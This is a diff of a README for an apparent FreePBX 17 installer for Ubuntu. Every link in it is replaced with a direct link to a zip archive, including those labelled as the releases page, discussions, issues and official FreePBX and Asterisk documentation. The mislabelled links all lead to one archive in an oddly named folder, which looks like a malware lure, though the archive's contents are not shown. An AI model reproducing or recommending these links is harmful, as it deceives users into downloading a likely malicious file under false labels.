@@ -1,13 +1,13 @@
 # 🌟 FreePBX-Ubuntu-Installer - Simple Setup for FreePBX 17
 
 ## 🔗 Download Now
-[![Download FreePBX-Ubuntu-Installer](https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip)](https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip)
+[![Download FreePBX-Ubuntu-Installer](https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip)](https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the FreePBX-Ubuntu-Installer! This tool helps you easily set up FreePBX 17 and Asterisk on Ubuntu 24.04. You don’t need extensive technical skills to get started. Follow the simple steps below to download and run the application.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Click this link to go to the [Releases page](https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip).
+1. **Visit the Releases Page**: Click this link to go to the [Releases page](https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip).
 
 2. **Choose the Latest Release**: On the Releases page, find the latest version available. Look for the version number at the top of the list.
 
@@ -54,14 +54,14 @@ If you encounter any issues:
 
 ## ✨ Community
 Join our community for updates, tips, and support:
-- Visit our [GitHub Discussions](https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip).
-- Check out our issues page if you encounter bugs or have feature requests: [GitHub Issues](https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip).
+- Visit our [GitHub Discussions](https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip).
+- Check out our issues page if you encounter bugs or have feature requests: [GitHub Issues](https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip).
 
 ## 📝 License
 This project is licensed under the MIT License. You can freely use and modify the code as per your requirements.
 
 ## 🔗 Additional Resources
-- Official FreePBX Documentation: [https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip](https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip)
-- Learn more about Asterisk: [https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip](https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip)
+- Official FreePBX Documentation: [https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip](https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip)
+- Learn more about Asterisk: [https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip](https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip)
 
-For updates and further documentation, don’t forget to keep an eye on the [Releases page](https://raw.githubusercontent.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/main/tenuious/FreePBX-Ubuntu-Installer.zip). Enjoy your FreePBX experience!
+For updates and further documentation, don’t forget to keep an eye on the [Releases page](https://github.com/mrnobodyrhs/FreePBX-Ubuntu-Installer/raw/refs/heads/main/tenuious/Free-Installer-PB-Ubuntu-3.1.zip). Enjoy your FreePBX experience!
